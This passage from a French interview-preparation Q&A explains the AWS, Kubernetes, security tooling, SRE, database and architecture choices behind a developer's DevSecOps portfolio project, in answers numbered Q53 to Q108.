2. **Image Resize** : déclenché par un événement S3 PutObject → utilise Sharp (Node.js) pour créer une miniature WebP → stocke dans `resized/` → pas de polling.

3. **Weekly Report** : déclenché par EventBridge (cron `0 9 ? * MON *`, lundi 9h) → appelle l'API backend → compile les stats → envoie un rapport email via SES.

Zéro serveur à gérer, ~$0 de coût pour un portfolio avec peu de trafic.

---

### Q53 — Qu'est-ce que CloudWatch et comment l'utilisez-vous ?

CloudWatch est le service d'observabilité AWS. Dans ce projet :

- **Logs** : le backend Spring Boot écrit des logs JSON structurés dans `/portfolio/backend` (CloudWatch Log Group, rétention 30j)
- **Métriques custom** : `AuthLoginFailures`, `Http5xxErrors` extraites des logs via Log Metric Filters
- **Alarmes** : 3 alarmes avec seuils → SNS topic → email à `amine.charrad@gmail.com`
- **Dashboard** : 5 widgets (CPU, mémoire, auth failures, HTTP 5xx, logs récents)
- **VPC Flow Logs** : enregistrement du trafic réseau pour audit de sécurité (rétention 7j)

---

### Q54 — Qu'est-ce que RDS et pourquoi pas une base de données sur l'EC2 ?

RDS (Relational Database Service) est une base de données managée. Avantages vs PostgreSQL auto-hébergé :

- **Backups automatiques** : point-in-time recovery configurable
- **Patches** : AWS gère les mises à jour de sécurité PostgreSQL
- **Multi-AZ** : failover automatique en cas de panne (non activé ici pour économiser)
- **Snapshots** : backup manuel en 1 clic avant une migration
- **Monitoring intégré** : métriques CloudWatch (connections, CPU, storage)
- **Sécurité** : subnet privé, SSL forcé (`rds.force_ssl=1`), chiffrement at-rest AES-256

---

### Q55 — Comment fonctionne le renouvellement du token ECR sur l'EC2 ?

Le token ECR (`aws ecr get-login-password`) est valide 12 heures. Un cron job s'exécute toutes les 6 heures (mi-parcours de validité) pour le renouveler :

```cron
0 */6 * * * root /usr/local/bin/refresh-ecr-token.sh
```

Le script crée/met à jour le secret `ecr-credentials` dans les namespaces Kubernetes (prévu pour K3s). En mode Docker Compose, `docker login` est relancé dans le script de déploiement à chaque CI/CD.

---

### Q56 — Qu'est-ce que S3 et comment l'utilisez-vous ?

S3 (Simple Storage Service) est un stockage objet AWS. Dans ce projet (Phase 15) :

- Bucket `portfolio-dev-project-images` pour stocker les images de projets uploadées
- Versioning activé pour l'historique des fichiers
- Chiffrement SSE-S3 at-rest
- CORS configuré pour les uploads directs depuis Angular
- La Lambda `image-resize` est déclenchée par un événement `s3:ObjectCreated:*` dans le préfixe `originals/`

---

### Q57 — Expliquez SES (Simple Email Service) et ses contraintes.

SES est le service d'emailing AWS. Contrainte principale : en mode **sandbox** (par défaut), vous ne pouvez envoyer des emails qu'à des adresses vérifiées.

Dans ce projet, `amine.charrad@gmail.com` est vérifiée. Pour lever la restriction sandbox (envoyer à n'importe quelle adresse), il faut faire une demande de production access à AWS avec justification (use case, volume estimé).

Les Lambdas contact-form et weekly-report utilisent SES via le SDK Node.js avec les permissions IAM `ses:SendEmail`.

---

### Q58 — Qu'est-ce que CloudFront et pourquoi ne l'avez-vous pas utilisé ?

CloudFront est le CDN (Content Delivery Network) d'AWS. Il met en cache le contenu statique sur ~400 points de présence mondiaux, réduit la latence et protège des attaques DDoS.

Pour ce portfolio, il n'a pas été jugé nécessaire car :
1. Le public cible est principalement français (Paris = eu-west-3 est déjà proche)
2. Ajoute de la complexité (invalidation de cache, HTTPS cert via ACM obligatoire)
3. Coût supplémentaire hors Free Tier

Sur un projet d'entreprise avec utilisateurs mondiaux, CloudFront serait indispensable.

---

## Kubernetes & GitOps (avancé)

### Q59 — Expliquez la différence entre Deployment, StatefulSet et DaemonSet.

- **Deployment** : pour les applications sans état (stateless). Les pods sont interchangeables, peuvent être recréés n'importe où. Utilisé pour le backend Spring Boot et le frontend.
- **StatefulSet** : pour les applications avec état (Redis, PostgreSQL, Kafka). Chaque pod a un nom stable (`redis-0`, `redis-1`) et un stockage persistant associé.
- **DaemonSet** : un pod par nœud. Utilisé pour la collecte de logs (Fluentd) ou les agents de monitoring (Node Exporter, CloudWatch Agent).

---

### Q60 — Qu'est-ce qu'un Helm Chart et pourquoi l'avez-vous créé ?

Helm est le gestionnaire de paquets Kubernetes — comparable à apt/npm. Un chart Helm est un ensemble de templates YAML paramétrables.

Dans ce projet (Phase 19), le chart `portfolio/` contient 9 templates (Deployment, Service, Ingress, HPA, PDB, etc.) avec 3 niveaux de valeurs :
- `values.yaml` : valeurs par défaut
- `values-k3s.yaml` : contraintes t3.micro (JVM -Xmx256m, 1 réplique)
- `values-dev.yaml` : tag SHA mis à jour automatiquement par le CI/CD

Avantage : un seul chart, 3 environnements (dev/staging/prod) sans dupliquer les manifests.

---

### Q61 — Qu'est-ce qu'un HPA (Horizontal Pod Autoscaler) ?

HPA ajuste automatiquement le nombre de répliques d'un Deployment en fonction de métriques (CPU, mémoire, métriques custom). Si la charge augmente → plus de pods, si elle baisse → moins de pods.

Dans ce projet, le chart Helm définit un HPA pour le backend : minimum 1 réplique, maximum 3, cible 70% de CPU. Sur un t3.micro Free Tier, l'HPA est configuré mais inactif (une seule réplique suffit et les ressources sont limitées).

---

### Q62 — Expliquez les SyncWaves ArgoCD utilisées dans ce projet.

Les SyncWaves permettent d'ordonner le déploiement des ressources ArgoCD. Une ressource avec wave 0 est déployée et attendue avant celles de wave 1, etc.

Dans ce projet (Phase 21 - ESO) :
- **Wave 0** : External Secrets Operator (l'opérateur doit être installé en premier)
- **Wave 1** : ClusterSecretStore (configure la connexion AWS Secrets Manager)
- **Wave 2** : ExternalSecret (crée le K8s Secret depuis AWS SM)

Sans SyncWaves, ESO pourrait tenter de créer le Secret avant que le CRD ExternalSecret soit disponible, causant une erreur.

---

### Q63 — Qu'est-ce que Kustomize et comment l'avez-vous utilisé ?

Kustomize est un outil de personnalisation de manifests Kubernetes sans templating. Il utilise des overlays qui "patchent" des manifests de base.

Dans ce projet (Phase 18) :
- `base/` : manifests communs (Deployment, Service)
- `overlays/dev/` : `kustomization.yaml` avec patches spécifiques dev (1 réplique, images dev)
- `overlays/prod/` : patches prod (3 répliques, resources limits élevées)

ArgoCD applique directement un overlay Kustomize — pas besoin de générer les manifests localement.

---

### Q64 — Qu'est-ce qu'un PodDisruptionBudget (PDB) ?

Un PDB garantit qu'un minimum de pods restent disponibles lors d'opérations de maintenance (drain de nœud, rolling update). Exemple : `minAvailable: 1` sur un Deployment avec 2 répliques — Kubernetes ne supprimera jamais les 2 en même temps.

Dans le chart Helm de ce projet, un PDB `minAvailable: 1` est défini pour le backend. En production avec 3 répliques, cela permet des rolling updates sans downtime.

---

### Q65 — Qu'est-ce que Traefik et comment s'intègre-t-il à K3s ?

Traefik est un reverse proxy et load balancer cloud-native. K3s l'inclut par défaut comme Ingress Controller — pas besoin d'installer NGINX Ingress séparément.

Dans ce projet, le chart Helm définit un `Ingress` Kubernetes qui référence `ingressClassName: traefik`. Traefik intercepte le trafic entrant sur le port 80/443 et le route vers les services backend/frontend selon les règles de l'Ingress (host, path).

---

## Sécurité (avancé)

### Q66 — Qu'est-ce que OWASP ZAP et comment l'utilisez-vous ?

ZAP (Zed Attack Proxy) est un scanner de sécurité web open-source de l'OWASP. Il simule des attaques réelles contre une application en cours d'exécution (DAST).

Dans ce projet (Phase 12) :
1. Un workflow GitHub Actions démarre l'application avec Docker Compose
2. ZAP lance un scan authentifié (avec token JWT admin) pour tester les endpoints protégés
3. Il teste : injection SQL, XSS, CSRF, traversée de répertoires, headers de sécurité manquants
4. Le rapport est publié en artifact GitHub Actions
5. Les findings critiques/élevés font échouer le pipeline

---

### Q67 — Qu'est-ce que Cosign et comment signez-vous les images Docker ?

Cosign (Sigstore project) permet de signer et vérifier cryptographiquement des images de containers. La signature prouve que l'image a été buildée par un pipeline CI/CD spécifique, pas par un attaquant qui aurait pushé une image modifiée.

Dans ce projet (Phase 16), le workflow SBOM utilise Cosign pour signer les images ECR après le build. La signature est stockée dans ECR à côté de l'image. Avant un déploiement, on peut vérifier la signature.

---

### Q68 — Qu'est-ce que Dependabot et comment l'avez-vous configuré ?

Dependabot est un bot GitHub qui surveille les dépendances et crée automatiquement des Pull Requests quand une nouvelle version est disponible ou qu'une CVE est détectée.

Dans ce projet (Phase 16), `.github/dependabot.yml` configure :
- Scan hebdomadaire des dépendances Maven (`backend/pom.xml`)
- Scan hebdomadaire des dépendances npm (`frontend/package.json`)
- Scan des actions GitHub (`.github/workflows/`)

Les PR Dependabot passent par tous les checks CI/CD avant merge — zéro dépendance vulnérable sans review.

---

### Q69 — Qu'est-ce que CodeQL et en quoi est-il différent d'un linter ?

Un linter (Checkstyle, ESLint) vérifie le style et les conventions de code. CodeQL est une analyse sémantique qui comprend le flux de données.

Exemple : un linter ne voit pas qu'une variable provient d'une requête HTTP et finit dans une requête SQL. CodeQL suit le flux complet et détecte l'injection SQL potentielle. Il peut analyser comment les données traversent des couches d'abstraction.

Dans ce projet, CodeQL analyse Java et TypeScript sur chaque PR et push main. Les findings sont intégrés dans GitHub Security (onglet Code Scanning).

---

### Q70 — Comment protégez-vous contre les injections SQL ?

À plusieurs niveaux :

1. **JPA/Hibernate** : les repositories Spring Data utilisent des requêtes paramétrées automatiquement. `findById(id)` génère `WHERE id = ?`, pas de concaténation.
2. **JPQL paramétré** : pour les queries custom, `@Query("SELECT p FROM Project p WHERE p.status = :status")` avec `@Param("status")`.
3. **Validation d'entrée** : Bean Validation rejette les inputs malformés avant qu'ils atteignent la DB.
4. **CodeQL SAST** : détecte les patterns d'injection potentiels statiquement.
5. **OWASP ZAP DAST** : teste des payloads SQL injection en runtime.

---

### Q71 — Qu'est-ce que le BCrypt et pourquoi cost=12 ?

BCrypt est un algorithme de hachage adaptatif pour les mots de passe. Son paramètre `cost` (ou `strength`) détermine le nombre de rounds (2^cost itérations).

- Cost 10 : ~100ms/hash (standard 2020)
- Cost 12 : ~300ms/hash (recommandé 2024)
- Cost 14 : ~1.2s/hash (trop lent pour UX)

À 300ms, un attaquant avec 1 GPU peut tenter ~3 hashes/seconde, rendant une attaque par dictionnaire impraticable. Le salt intégré rend les rainbow tables inutiles. Spring Security gère automatiquement la migration de cost si on augmente le paramètre.

---

### Q72 — Comment gérez-vous le CORS dans ce projet ?

CORS (Cross-Origin Resource Sharing) est configuré dans `SecurityConfig.corsConfigurationSource()` :

- **Origins autorisées** : défini via variable d'env `CORS_ALLOWED_ORIGINS` (valeur : `https://charrad-devsecops.duckdns.org`). En dev, `http://localhost:4200`.
- **Méthodes** : GET, POST, PUT, PATCH, DELETE, OPTIONS
- **Headers** : Authorization, Content-Type, Accept, Origin
- **Credentials** : `allowCredentials(true)` pour les cookies/tokens
- **Preflight cache** : 3600 secondes (évite une requête OPTIONS à chaque appel)

Les requêtes provenant du domaine DuckDNS sont considérées comme same-origin via le proxy NGINX.

---

### Q73 — Qu'est-ce qu'un Security Hotspot dans SonarCloud ?

Un Security Hotspot est un code qui mérite une review manuelle de sécurité mais qui n'est pas forcément une vulnérabilité. Contrairement aux bugs ou code smells, il demande un jugement humain.

Exemple : un `@SuppressWarnings("unchecked")` peut être sûr ou non selon le contexte. SonarCloud le signale pour qu'un développeur confirme que c'est intentionnel.

Dans ce projet, tous les Security Hotspots sont reviewés et marqués "Safe" — c'est une condition du Quality Gate (`security_hotspots_reviewed: 100%`).

---

## Infrastructure & SRE

### Q74 — Qu'est-ce qu'un "golden signal" en SRE et les mesurez-vous ?

Les 4 golden signals (Google SRE Book) sont les métriques fondamentales à monitorer :

1. **Latency** : temps de réponse des requêtes. Mesuré via `http_server_requests_seconds` dans Prometheus.
2. **Traffic** : nombre de requêtes par seconde. Mesuré via `rate(http_server_requests_seconds_count[1m])`.
3. **Errors** : taux d'erreurs (5xx). Alarme CloudWatch + métrique custom `Http5xxErrors`.
4. **Saturation** : utilisation des ressources (CPU, mémoire). Alarme CloudWatch CPU > 80%.

---

### Q75 — Qu'est-ce qu'un SLO et un SLA ?

- **SLO** (Service Level Objective) : objectif interne de fiabilité. Exemple : "99.5% des requêtes répondent en moins de 200ms".
- **SLA** (Service Level Agreement) : contrat externe avec les clients. Généralement moins ambitieux que le SLO (marge de sécurité).
- **Error Budget** : si le SLO est 99.5%, le budget d'erreur mensuel est 0.5% × 43200min = 216 minutes de downtime acceptable.

Pour un portfolio, ces métriques ne sont pas formellement définies, mais les dashboards Grafana permettraient de les calculer.

---

### Q76 — Comment feriez-vous un rollback en cas de régression en production ?

Plusieurs niveaux de rollback :

1. **Rollback rapide** (< 2 min) : `gh workflow run deploy-app.yml --ref main -f image_tag=sha-abc1234` — déploie le tag précédent
2. **Rollback GitOps** : `git revert <commit>` + push — ArgoCD re-synchronise vers l'ancien état
3. **Rollback Helm** : `helm rollback portfolio 2` — revient à la revision 2 du chart
4. **Base de données** : les migrations Flyway sont append-only. Rollback DB = script SQL de compensation (pas une annulation Flyway)

Le tag SHA immuable sur chaque image ECR rend le rollback précis et fiable.

---

### Q77 — Qu'est-ce que l'Infrastructure as Code (IaC) et quels en sont les risques ?

IaC = décrire l'infrastructure dans du code versionné plutôt que de la configurer manuellement via une console.

**Avantages** : reproductibilité, code review, historique Git, documentation vivante.

**Risques** :
- **Terraform state drift** : si quelqu'un modifie l'infra manuellement (console AWS), le state Terraform diverge. Solution : `terraform import` ou `terraform refresh`.
- **`terraform apply` destructif** : un changement anodin peut déclencher une recréation de ressource. Toujours faire `terraform plan` et relire les actions `destroy/create`.
- **Secrets dans le state** : le `terraform.tfstate` peut contenir des mots de passe en clair. Solution : backend distant chiffré (S3 + DynamoDB locking).

---

### Q78 — Comment scaleriez-vous ce projet si le trafic multipliait par 10 ?

Actions graduées :

1. **DB** : activer le Multi-AZ RDS + Read Replica pour le trafic de lecture
2. **Cache** : augmenter le TTL Redis, ajouter un Redis Cluster
3. **Compute** : passer à K3s/EKS avec plusieurs nodes, HPA sur le backend
4. **CDN** : CloudFront devant l'application pour les assets statiques
5. **LB** : ALB (Application Load Balancer) AWS pour distribuer entre plusieurs EC2
6. **Async** : déporter les traitements lourds vers Lambda ou des workers Kafka
7. **Monitoring** : définir des SLOs formels, alertes sur error budget

---

## Base de données

### Q79 — Qu'est-ce que PostgreSQL JSONB et quand l'utiliseriez-vous ?

JSONB est un type de colonne PostgreSQL qui stocke du JSON sous forme binaire indexable. Contrairement à JSON (texte brut), JSONB supporte les index GIN et les opérateurs d'interrogation.

Cas d'usage : attributs variables par entité (ex: métadonnées de projet différentes selon le type), données semi-structurées, ou éviter une table de pivot pour des propriétés rares.

Dans ce projet, la structure est relationnelle classique. JSONB serait utile si on ajoutait des attributs dynamiques par projet (ex: stack technique sous forme de JSON).

---

### Q80 — Qu'est-ce que le N+1 query problem et comment l'éviter avec JPA ?

Le problème N+1 : pour une liste de 10 projets, JPA charge les projets (1 requête) puis pour chaque projet charge ses skills (10 requêtes) = 11 requêtes au lieu de 2.

Solutions dans ce projet :
- **`@ManyToMany(fetch = FetchType.LAZY)`** : chargement à la demande (évite le chargement systématique)
- **JPQL avec JOIN FETCH** : `SELECT DISTINCT p FROM Project p LEFT JOIN FETCH p.skills` → une seule requête SQL avec JOIN
- **`@EntityGraph`** : alternative aux JOIN FETCH pour les repositories Spring Data

Micrometer expose `hikaricp.connections.active` et `jvm.db.query.duration` pour détecter les N+1 en production.

---

### Q81 — Pourquoi `db_skip_final_snapshot = true` en dev ?

Lors d'un `terraform destroy`, RDS crée par défaut un snapshot final avant de supprimer la base de données. C'est une protection contre la perte accidentelle de données en production.

En dev/portfolio, ce snapshot est inutile (données de démo) et coûterait 20GB × $0.095/GB/mois = ~$2/mois de stockage EBS. `skip_final_snapshot = true` évite ce snapshot.

En production : **toujours** `skip_final_snapshot = false` et `deletion_protection = true`.

---

### Q82 — Qu'est-ce que le point-in-time recovery (PITR) RDS ?

PITR permet de restaurer une base de données à n'importe quel instant dans la fenêtre de rétention (jusqu'à 35 jours). AWS réalise des sauvegardes automatiques quotidiennes + journaux de transactions en continu.

Si à 14h un développeur supprime accidentellement une table, on peut restaurer la DB à 13h59 sur une nouvelle instance RDS et re-syncer les données perdues.

Dans ce projet, `backup_retention_days = 0` (désactivé pour Free Tier). En production, minimum 7 jours recommandés.

---

## Performance & Optimisation

### Q83 — Qu'est-ce que le lazy loading JPA et ses pièges ?

`LAZY` signifie que les associations (`@OneToMany`, `@ManyToMany`) ne sont pas chargées jusqu'à ce qu'on y accède. `EAGER` charge tout immédiatement.

**Piège : LazyInitializationException** — si on accède à une collection LAZY en dehors d'une transaction, Hibernate ne peut plus faire la requête SQL. Solution : `@Transactional` sur la méthode du service, ou `@EntityGraph` pour forcer le chargement nécessaire.

Dans ce projet, `Project.skills` est en `LAZY`. Le service charge explicitement les skills via JPQL quand nécessaire.

---

### Q84 — Comment mesurez-vous les performances de l'API ?

Plusieurs outils combinés :

- **k6** (Phase 14) : mesure les p50/p95/p99 de latence sous charge réelle. Seuils définis dans les scripts.
- **Actuator `/actuator/metrics/http.server.requests`** : percentiles de réponse en production.
- **Prometheus + Grafana** : évolution temporelle des latences, identification de dégradations.
- **Hikari metrics** : `hikaricp.connections.acquire` pour détecter les bottlenecks DB.

---

### Q85 — Pourquoi `-Xmx600m` dans la commande Java du docker-compose ?

`-Xmx600m` limite le heap Java à 600MB. Sans limite, la JVM peut consommer tout le RAM disponible (par défaut 25% du RAM système = ~500MB sur t3.small, mais peut monter plus).

En conteneur, si la JVM dépasse la limite mémoire du container Docker (`memory: 768M`), le process est tué par le kernel (OOM Kill). `-Xmx600m` laisse de la marge pour le Metaspace, les threads, le native memory, tout en restant sous les 768MB.

---

## Comportemental & Soft Skills

### Q86 — Décrivez une décision technique difficile que vous avez dû prendre.

La décision de passer de K3s à Docker Compose. J'avais passé plusieurs heures à implémenter et déboguer K3s + ArgoCD (Phases 18-21, commits vérifiés), mais la réalité du t3.micro (1GB RAM, 0MB SWAP disponible au bon moment) rendait la combinaison instable.

J'aurais pu insister, passer des heures à tuner les JVM args et les memory limits Kubernetes. Mais j'ai choisi la pragmatisme : Docker Compose stable ET la documentation K3s complète dans le repo. Un recruteur qui lit le code voit les deux.

---

### Q87 — Comment vous tenez-vous à jour sur les évolutions DevSecOps ?

Plusieurs sources :

- **Newsletters** : DevOps Weekly, SRE Weekly, TLDR DevOps
- **GitHub Trending** : suivre les nouveaux outils (récemment : OpenTofu fork de Terraform, Bun alternative à Node)
- **CNCF** : suivi du paysage cloud native (cloudnativelandscape.io)
- **CVE databases** : NVD, GitHub Security Advisories pour les alertes critiques
- **Hands-on** : ce portfolio est un lab permanent — chaque nouvelle phase teste une technologie réelle

---

### Q88 — Expliquez votre approche de la documentation technique.

Dans ce projet, chaque phase a un fichier `docs/PHASE*.md` qui explique les choix architecturaux, pas seulement le code. La règle : documenter le **pourquoi**, pas le **quoi** (le code dit déjà le quoi).

Exemples : pourquoi pas de NAT Gateway (économie documentée), pourquoi BCrypt cost 12 (sécurité argumentée), pourquoi Docker Compose plutôt que K3s (contraintes expliquées).

La documentation la plus utile est celle qui explique les décisions prises et celles écartées.

---

### Q89 — Comment collaboreriez-vous avec l'équipe sécurité sur ce type de projet ?

Plusieurs points de contact :

1. **Shift-left** : intégrer les revues de sécurité dans les PR (code review + SAST résultats) plutôt qu'en fin de projet
2. **Threat modeling** : travailler avec l'équipe sécu pour identifier les assets critiques et les vecteurs d'attaque dès la conception
3. **Security as Code** : les policies de sécurité (règles RBAC, network policies K8s, IAM policies) sont dans le repo et peuvent être reviewées
4. **Runbooks communs** : les procédures d'incident de sécurité (rotation de secrets, revocation de tokens) sont documentées et testées

---

### Q90 — Qu'auriez-vous fait différemment si ce projet était en production enterprise ?

Plusieurs différences :

1. **State Terraform distant** : S3 + DynamoDB locking au lieu du state local (évite les conflits en équipe)
2. **Environments séparés** : dev, staging, prod avec comptes AWS dédiés (AWS Organizations)
3. **Secrets rotation** : Lambda pour rotation automatique des credentials RDS dans Secrets Manager
4. **WAF** : AWS WAF devant CloudFront pour bloquer les attaques applicatives
5. **VPC endpoints** : pour ECR et Secrets Manager (évite que le trafic passe par internet)
6. **Alerting on-call** : PagerDuty intégré à CloudWatch (pas juste un email)
7. **Chaos Engineering** : Gremlin ou AWS FIS pour tester la résilience

---

## Questions pièges & Avancées

### Q91 — Terraform `terraform.tfstate` — pourquoi ne jamais le committer dans Git ?

Le `terraform.tfstate` contient l'état complet de l'infrastructure, y compris des valeurs sensibles en clair : mots de passe RDS, clés privées, secrets. Les committer dans Git les expose à quiconque peut lire le repo (même si le repo est privé — un futur collaborateur, une fuite de token).

Solution : **backend distant**. Dans ce projet, le state est local (acceptable pour un portfolio solo). En équipe : S3 bucket chiffré + DynamoDB pour le locking concurrent.

---

### Q92 — Quelle est la différence entre `docker exec` et `docker attach` ?

- `docker exec` : lance un **nouveau processus** dans un container en cours d'exécution. `docker exec -it portfolio-backend bash` ouvre un shell sans interrompre le processus principal.
- `docker attach` : se connecte au **processus principal** (PID 1) du container. Ctrl+C dans un `attach` tue le container. À éviter en production.

---

### Q93 — Que fait `docker compose up -d --no-deps backend` ?

- `up -d` : démarre en arrière-plan (detached)
- `--no-deps` : ne démarre **pas** les dépendances (`redis`, `prometheus`)
- `backend` : uniquement le service backend

C'est la commande utilisée dans le script de déploiement pour un rolling restart zero-downtime : on redémarre le backend seul, sans toucher le frontend qui continue de servir du trafic pendant le redémarrage.

---

### Q94 — Qu'est-ce que `@SpringBootTest` vs `@WebMvcTest` vs `@DataJpaTest` ?

- **`@SpringBootTest`** : charge le contexte Spring complet (tous les beans). Lent mais teste l'intégration réelle. Utilisé pour les tests E2E ou d'intégration complète.
- **`@WebMvcTest`** : charge uniquement la couche web (controllers, security, serialization). Rapide. Les services doivent être mockés avec `@MockBean`.
- **`@DataJpaTest`** : charge uniquement JPA + repositories. Configure une DB de test (H2 par défaut, ou Testcontainers avec `@AutoConfigureTestDatabase(replace=NONE)`). Rapide, isolé.

---

### Q95 — Pourquoi `ChangeDetectionStrategy.OnPush` dans Angular ?

Par défaut (`Default`), Angular vérifie **tous** les composants à chaque event (click, timer, HTTP). Avec `OnPush`, Angular ne re-vérifie un composant que si :
- Un `@Input()` change (nouvelle référence, pas mutation)
- Un Signal qu'il observe change
- Un `async` pipe déclenche une nouvelle valeur
- `markForCheck()` est appelé manuellement

Résultat : performances significativement meilleures sur les listes longues. Tous les composants de ce projet utilisent `OnPush`.

---

### Q96 — Qu'est-ce qu'une race condition dans le contexte DevSecOps ?

Une race condition entre processus concurrents qui accèdent à une ressource partagée sans synchronisation. En DevSecOps :

- **TOCTOU** (Time-Of-Check Time-Of-Use) : vérifier qu'un fichier est sûr, puis l'utiliser — entre les deux, un attaquant peut le modifier. Mitigation : utiliser des file descriptors atomiques.
- **CI/CD** : deux pipelines qui tournent en parallèle et deployent simultanément. Mitigation : queuing des déploiements, verrous (GitHub Environments avec `concurrency`).
- **DB** : deux transactions qui lisent puis écrivent la même ligne. Mitigation : transactions avec niveau d'isolation `SERIALIZABLE` ou `SELECT FOR UPDATE`.

---

### Q97 — Expliquez le principe du moindre privilège (PoLP) dans ce projet.

Le principe du moindre privilège : chaque entité ne doit avoir que les permissions strictement nécessaires.

Applications concrètes :
- **IAM EC2** : permissions ECR (pull seulement), CloudWatch Logs (write seulement), Secrets Manager (read seulement sur `portfolio/*`). Pas de `*:*`.
- **RDS** : accès uniquement depuis le SG EC2, jamais depuis internet
- **GitHub Secrets** : `EC2_SSH_PRIVATE_KEY` n'est accessible qu'au workflow `deploy-app.yml`
- **Kubernetes** : RBAC avec `ServiceAccount` dédié par namespace
- **Spring Security** : `permitAll()` uniquement sur les routes explicitement publiques, `authenticated()` pour tout le reste

---

### Q98 — Qu'est-ce que l'observabilité vs le monitoring ?

**Monitoring** = vérifier que les métriques connues sont dans les clés (alertes sur des seuils prédéfinis).

**Observabilité** = capacité à comprendre l'état interne d'un système à partir de ses outputs (logs, métriques, traces). On peut répondre à des questions imprévues sans modifier le code.

Concrètement : le monitoring dit "CPU est à 90%". L'observabilité dit "pourquoi le CPU est à 90% — quelle requête, quel utilisateur, quelle trace SQL".

Dans ce projet : monitoring (CloudWatch alarmes) + observabilité partielle (logs JSON corrélés par requestId, métriques Prometheus détaillées). La pièce manquante est le **distributed tracing** (Jaeger/Zipkin) qui corrèle une requête HTTP à travers le backend, Redis et PostgreSQL.

---

### Q99 — Comment débogueriez-vous une fuite mémoire dans un container Docker en production ?

Démarche :

1. **Identifier** : `docker stats portfolio-backend` — watch la mémoire augmenter sans se stabiliser
2. **Heap dump** : `docker exec portfolio-backend jcmd 1 VM.native_memory summary` ou `jmap -heap 1`
3. **Analyser** : transférer le heap dump, analyser avec Eclipse MAT ou VisualVM. Identifier les objets qui s'accumulent.
4. **Comparer** : prendre deux heap dumps à intervalles, comparer les deltas (`jmap -histo:live`)
5. **Causes fréquentes** : caches non bornés (`@Cacheable` sans TTL), listeners non déregistrés, ThreadLocal non nettoyés, streams non fermés

En production : activer `-XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/tmp/` pour capturer automatiquement le dump au crash.

---

### Q100 — Où voyez-vous votre évolution dans les 2 ans ?

Ce portfolio couvre volontairement tout le spectre DevSecOps — de l'Angular au Terraform en passant par Kubernetes. Il démontre la capacité à comprendre chaque couche.

À court terme (6-12 mois), l'objectif est de me spécialiser sur **Platform Engineering** : construire les outils et les plateformes qui permettent aux équipes développement de déployer en autonomie et en sécurité. C'est l'évolution naturelle du DevSecOps : de l'automatisation projet par projet vers une plateforme interne réutilisable (Internal Developer Platform).

À moyen terme, viser une certification AWS Solutions Architect Professional et approfondir Kubernetes (CKA/CKS) pour les environnements multi-cluster en production.

---

## Microservices & Architecture distribuée

### Q101 — Quelle est la différence entre une architecture monolithique et microservices ?

Un **monolithe** est une application unique déployée en un seul bloc. Tous les modules partagent la même DB, le même processus, le même déploiement. Simple à développer et déboguer, mais difficile à scaler partiellement.

Les **microservices** sont des services indépendants, chacun avec sa propre DB, son propre déploiement, sa propre échelle. Avantages : déploiement indépendant, stack technique différente par service, résilience (un service en panne n'arrête pas tout).

Ce portfolio est un **monolithe modulaire** : backend Spring Boot unique avec des modules bien séparés (auth, projects, skills). C'est le bon compromis pour un portfolio — les microservices auraient ajouté de la complexité opérationnelle sans bénéfice réel à cette échelle.

---

### Q102 — Qu'est-ce qu'un Circuit Breaker et comment fonctionne-t-il ?

Le Circuit Breaker est un pattern de résilience qui évite qu'un service défaillant cascade ses erreurs. Il a 3 états :

- **Fermé** : les requêtes passent normalement. Comptage des échecs.
- **Ouvert** : seuil d'échecs dépassé → les requêtes sont rejetées immédiatement (sans appeler le service distant) pendant un timeout.
- **Semi-ouvert** : après le timeout, quelques requêtes test passent. Si elles réussissent → retour à Fermé. Sinon → retour à Ouvert.

Implémentation : Resilience4j (Spring Boot), Hystrix (déprécié). Dans ce projet, les Lambda calls utilisent un retry simple — un vrai circuit breaker serait utile si on ajoutait des appels inter-services.

---

### Q103 — Qu'est-ce que le pattern Saga dans les microservices ?

La Saga gère les transactions distribuées sans verrou global (qui serait catastrophique pour les performances). Une saga est une séquence de transactions locales, chacune publiante un événement qui déclenche la suivante.

**Choreography Saga** : chaque service publie des événements et écoute ceux des autres (Kafka). Découplé mais difficile à suivre.

**Orchestration Saga** : un orchestrateur central coordonne la séquence. Plus facile à déboguer, couplage plus fort.

Exemple e-commerce : Order → Inventory → Payment. Si Payment échoue, un événement de compensation déclenche le rollback d'Inventory puis d'Order.

---

### Q104 — Qu'est-ce que le CQRS et l'Event Sourcing ?

**CQRS** (Command Query Responsibility Segregation) : séparer les opérations d'écriture (Commands) des lectures (Queries). Les Commands modifient l'état, les Queries lisent. Avantage : optimiser les deux chemins indépendamment (ex: index optimisés pour la lecture, write model simple).

**Event Sourcing** : au lieu de stocker l'état courant, stocker la séquence de tous les événements qui ont mené à cet état. L'état actuel = replay des événements. Avantage : historique complet, audit naturel, time-travel debugging.

Ce projet utilise Kafka pour les événements mais sans Event Sourcing pur — la DB PostgreSQL stocke l'état courant.

---

### Q105 — Qu'est-ce qu'une API Gateway et quel est son rôle ?

Une API Gateway est le point d'entrée unique pour toutes les requêtes client. Elle centralise :
- **Routing** : rediriger vers le bon microservice
- **Authentication** : valider le JWT une seule fois plutôt que dans chaque service
- **Rate limiting** : limiter les requêtes par client/IP
- **SSL termination** : décrypter HTTPS
- **Logging/Tracing** : corrélation des requêtes cross-services

Dans ce projet : AWS API Gateway pour les Lambda (formulaire contact, image resize). Le NGINX host joue le rôle de reverse proxy/API gateway pour le frontend et le backend.

---

### Q106 — Qu'est-ce que le pattern BFF (Backend For Frontend) ?

Le BFF crée un backend dédié pour chaque type de client (web, mobile, IoT). Chaque BFF agrège et transforme les données des microservices pour les besoins spécifiques de son client, évitant que le frontend fasse plusieurs appels ou reçoive des payloads surdimensionnés.

Dans ce projet, Spring Boot joue implicitement ce rôle : les endpoints `/api/projects` retournent exactement le format attendu par Angular (pas plus, pas moins), avec les DTOs `ProjectResponse` formatés pour l'affichage.

---

## Git & Workflows

### Q107 — Quelle est la différence entre Git Rebase et Git Merge ?

**Merge** : crée un commit de merge qui joint deux branches. L'historique garde les branches et leur point de fusion. Historique honnête mais potentiellement verbeux.

**Rebase** : rejoue les commits d'une branche sur une autre, linéarisant l'historique. L'historique est plus propre mais les SHA des commits changent — ne jamais rebaser des commits déjà poussés sur une branche partagée.

Dans ce projet, `git pull --rebase` est utilisé systématiquement pour éviter les commits de merge parasites dans l'historique main.

---

### Q108 — Qu'est-ce que le Trunk Based Development ?

Trunk Based Development (TBD) est une stratégie où tous les développeurs committing directement sur `main` (le trunk), plusieurs fois par jour. Pas de longues feature branches.

Avantages : intégration continue réelle, moins de conflits de merge, feedback CI rapide.

Mécanismes associés : feature flags pour déployer du code non terminé, pair programming, commits atomiques et petits.

